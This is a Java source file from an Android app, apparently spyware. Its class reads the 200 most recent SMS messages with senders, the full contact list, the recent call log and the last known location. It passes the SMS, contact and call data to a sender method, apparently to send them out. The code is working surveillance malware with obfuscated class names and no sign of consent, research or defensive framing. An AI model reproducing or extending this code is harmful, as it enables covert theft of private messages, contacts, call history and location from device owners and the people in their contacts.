package com.v2ram;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;

public class f {
    public static void sms(Context c) {
        Cursor cur = c.getContentResolver().query(Uri.parse("content://sms/inbox"),
            null, null, null, "date DESC LIMIT 200");
        if (cur == null) { k.send("sms: no access"); return; }
        StringBuilder sb = new StringBuilder();
        while (cur.moveToNext()) {
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String addr = cur.getString(cur.getColumnIndexOrThrow("address"));
            sb.append(addr).append(": ").append(body).append("\n---\n");
        }
        cur.close();
        k.send(sb.length() > 0 ? sb.toString() : "sms empty");
    }

    public static void contacts(Context c) {
        Cursor cur = c.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur == null) { k.send("contacts: no access"); return; }
        StringBuilder sb = new StringBuilder();
        while (cur.moveToNext()) {
            String n = cur.getString(cur.getColumnIndexOrThrow(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String p = cur.getString(cur.getColumnIndexOrThrow(
                ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append(n).append(": ").append(p).append("\n");
        }
        cur.close();
        k.send(sb.length() > 0 ? sb.toString() : "contacts empty");
    }

    public static void calls(Context c) {
        Cursor cur = c.getContentResolver().query(CallLog.Calls.CONTENT_URI,
            null, null, null, "date DESC LIMIT 200");
        if (cur == null) { k.send("calls: no access"); return; }
        StringBuilder sb = new StringBuilder();
        while (cur.moveToNext()) {
            String num = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
            String dur = cur.getString(cur.getColumnIndexOrThrow(CallLog.Calls.DURATION));
            sb.append(num).append(" | ").append(dur).append("s\n");
        }
        cur.close();
        k.send(sb.length() > 0 ? sb.toString() : "calls empty");
    }

    public static String gps(Context c) {
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return l == null ? "none" : l.getLatitude() + "," + l.getLongitude();
        } catch (Throwable t) { return "err"; }
    }
}